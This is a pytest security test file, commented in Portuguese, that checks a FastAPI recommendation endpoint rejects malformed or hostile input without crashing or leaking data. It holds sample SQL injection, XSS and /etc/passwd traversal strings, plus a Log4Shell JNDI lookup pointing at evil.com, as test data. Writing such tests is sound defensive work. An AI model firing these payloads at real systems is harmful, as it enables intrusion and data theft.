"""
Testes de segurança / vulnerabilidade.

Simulam ataques comuns contra APIs REST:
- Injeção (SQLi-like, XSS)
- Path traversal
- Payloads oversize / malformados
- Tipos incorretos, coerção maliciosa
- Métodos HTTP não permitidos
- Boundary attacks nos limites de validação

Espera-se que a API responda com 4xx (nunca 500) para todos os
inputs mal-formados e que nunca reflita payload malicioso sem sanitização.
"""

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

pytestmark = pytest.mark.security


# ---------------------------------------------------------------------------
# Injection-like payloads
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "malicious_user_id",
    [
        "1 OR 1=1",
        "1; DROP TABLE users;--",
        "<script>alert('xss')</script>",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/x}",
        "1 UNION SELECT * FROM users",
        "\x00\x01\x02",
    ],
)
def test_recommend_rejects_injection_attempts_in_user_id(
    api_client: TestClient, malicious_user_id: str
) -> None:
    """
    Como `user_id` é `int` no schema, qualquer string maliciosa deve ser
    rejeitada pelo Pydantic antes de tocar em qualquer lógica de negócio.

    A resposta ainda pode ecoar o input no campo `input` do erro Pydantic —
    isso é seguro por ser JSON (não HTML), então validamos o Content-Type
    em vez de sanitização do conteúdo.
    """

    response = api_client.post(
        "/api/v1/recommend",
        json={"user_id": malicious_user_id, "top_k": 5},
    )

    assert response.status_code == 422, response.text
    assert response.headers["content-type"].startswith("application/json")


# ---------------------------------------------------------------------------
# Boundary attacks
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "boundary_case",
    [
        {"user_id": 0, "top_k": 5},               # user_id abaixo do mínimo
        {"user_id": -1, "top_k": 5},              # user_id negativo
        {"user_id": 1, "top_k": 0},               # top_k abaixo do mínimo
        {"user_id": 1, "top_k": 101},             # top_k acima do máximo
        {"user_id": 1, "top_k": -100},            # top_k muito negativo
    ],
)
def test_recommend_rejects_out_of_bounds(
    api_client: TestClient, boundary_case: dict
) -> None:
    """Todos os valores fora dos limites devem gerar 422, jamais 500."""

    response = api_client.post("/api/v1/recommend", json=boundary_case)
    assert response.status_code == 422, response.text


def test_recommend_handles_extremely_large_user_id_gracefully(
    api_client: TestClient,
) -> None:
    """
    Python tem int arbitrário — o schema não impõe limite superior.
    O importante: a API não pode crashar, deve responder 2xx ou 4xx.
    """

    response = api_client.post(
        "/api/v1/recommend", json={"user_id": 2**63, "top_k": 3}
    )
    assert response.status_code < 500


# ---------------------------------------------------------------------------
# Tipos e coerção
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "bad_payload",
    [
        {},  # ausência de campos obrigatórios
        {"user_id": None},
        {"user_id": [1, 2, 3]},
        {"user_id": {"nested": 1}},
        {"user_id": 1.5, "top_k": 5},   # float com fração — não coerce para int
    ],
)
def test_recommend_rejects_wrong_types(
    api_client: TestClient, bad_payload: dict
) -> None:
    response = api_client.post("/api/v1/recommend", json=bad_payload)
    assert response.status_code in (400, 422), response.text


# ---------------------------------------------------------------------------
# Body malformado / oversize
# ---------------------------------------------------------------------------


def test_recommend_rejects_malformed_json(api_client: TestClient) -> None:
    """JSON quebrado deve retornar 4xx, jamais 500."""

    response = api_client.post(
        "/api/v1/recommend",
        content=b"{ invalid json",
        headers={"content-type": "application/json"},
    )
    assert 400 <= response.status_code < 500, response.text


def test_recommend_rejects_wrong_content_type(api_client: TestClient) -> None:
    """Content-Type inválido não pode ser interpretado como JSON."""

    response = api_client.post(
        "/api/v1/recommend",
        content=b"user_id=1&top_k=5",
        headers={"content-type": "application/x-www-form-urlencoded"},
    )
    assert 400 <= response.status_code < 500


def test_recommend_handles_extra_unknown_fields(api_client: TestClient) -> None:
    """
    Campos extras não declarados no schema não devem quebrar a API
    nem serem persistidos/refletidos.
    """

    response = api_client.post(
        "/api/v1/recommend",
        json={
            "user_id": 1,
            "top_k": 3,
            "admin": True,
            "role": "superuser",
            "__proto__": {"polluted": True},
        },
    )

    assert response.status_code in (200, 422)
    if response.status_code == 200:
        payload = response.json()
        assert "admin" not in payload
        assert "role" not in payload


# ---------------------------------------------------------------------------
# Métodos HTTP indevidos
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("method", ["GET", "PUT", "DELETE", "PATCH"])
def test_recommend_rejects_wrong_http_method(
    api_client: TestClient, method: str
) -> None:
    """/recommend só aceita POST."""

    response = api_client.request(
        method, "/api/v1/recommend", json={"user_id": 1}
    )
    assert response.status_code in (404, 405)


@pytest.mark.parametrize("method", ["POST", "PUT", "DELETE"])
def test_health_rejects_write_methods(
    api_client: TestClient, method: str
) -> None:
    """/health é read-only (GET)."""

    response = api_client.request(method, "/api/v1/health")
    assert response.status_code in (404, 405)


# ---------------------------------------------------------------------------
# Path traversal em rota
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "traversal_path",
    [
        "/api/v1/../../../../etc/passwd",
        "/api/v1/health/../recommend",
        "/api/v1/%2e%2e/%2e%2e/etc/passwd",
    ],
)
def test_path_traversal_does_not_leak_files(
    api_client: TestClient, traversal_path: str
) -> None:
    """A API não deve servir arquivos do disco por tentativas de traversal."""

    response = api_client.get(traversal_path)
    body = response.text.lower()

    assert response.status_code in (200, 307, 308, 404, 405, 422)
    assert "root:x:" not in body
    assert "bin/bash" not in body


# ---------------------------------------------------------------------------
# Sanidade da resposta
# ---------------------------------------------------------------------------


def test_error_responses_do_not_leak_stacktrace(api_client: TestClient) -> None:
    """
    Uma requisição inválida não deve retornar tracebacks Python.
    """

    response = api_client.post(
        "/api/v1/recommend", json={"user_id": "abc"}
    )
    body = response.text.lower()

    assert "traceback" not in body
    assert 'file "' not in body
    assert "raise " not in body
